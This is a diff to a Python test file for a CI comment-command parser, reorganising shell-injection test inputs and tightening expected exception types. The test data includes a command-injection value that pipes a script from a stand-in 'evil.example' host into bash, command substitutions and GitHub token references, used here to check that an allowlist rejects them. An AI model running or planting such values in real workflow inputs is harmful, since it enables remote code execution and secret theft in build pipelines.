@@ -3,7 +3,7 @@ from parse_test_comment_command import format_outputs, main, parse_command
 
 # Shell metacharacters that must never reach the workflow `run:` blocks that
 # interpolate the `markers` output into a `model-config-tests -m "..."` command.
-INJECTION_MARKERS = [
+INJECTION_MARKERS_MALICIOUS = [
     'x"; curl https://evil.example/s.sh | bash; "',
     "$(whoami)",
     "`id`",
@@ -11,16 +11,18 @@ INJECTION_MARKERS = [
     "slow && curl evil.example",
     "slow | tee /tmp/x",
     "slow > /tmp/x",
-    "slow\\",
     "$GITHUB_TOKEN",
     "${{ secrets.GITHUB_TOKEN }}",
     "slow#comment",
-    "slow'quote",
     "markers=pwned\ntest-type=repro",
+]
+INJECTION_MARKERS_UNPARSABLE = [
+    "slow'quote",
+    "slow\\",
 ]
 
 
-def assert_rejected(command_body: str, exception_type: Exception) -> None:
+def assert_rejected(command_body: str, exception_type: type[BaseException]) -> None:
     """Assert a command body is rejected.
 
     Bad input is refused either by argparse (SystemExit) or, for input that
@@ -100,17 +102,23 @@ class TestInvalidCommands:
         ],
     )
     def test_rejects_invalid_args(self, body):
-        assert_rejected(body)
+        assert_rejected(body, SystemExit)
 
-    @pytest.mark.parametrize("markers", INJECTION_MARKERS)
-    def test_rejects_shell_metacharacters(self, markers):
+    @pytest.mark.parametrize("markers", INJECTION_MARKERS_MALICIOUS)
+    def test_rejects_malicious_shell_metacharacters(self, markers):
         """The allowlist is a security control - it must reject anything
         that could break out of the quoting in the workflow `run:` block."""
-        assert_rejected(f"!test repro --markers={markers}")
+        assert_rejected(f"!test repro --markers={markers}", SystemExit)
+
+    @pytest.mark.parametrize("markers", INJECTION_MARKERS_UNPARSABLE)
+    def test_rejects_unparsable_marker_strings(self, markers):
+        """The allowlist is a security control - it must reject anything
+        that could break out of the quoting in the workflow `run:` block."""
+        assert_rejected(f"!test repro --markers={markers}", ValueError)
 
     @pytest.mark.parametrize("body", ['!test repro -m "slow', "!test repro -m slow\\"])
     def test_rejects_malformed_quoting(self, body):
-        assert_rejected(body)
+        assert_rejected(body, ValueError)
 
 
 class TestFormatOutputs:
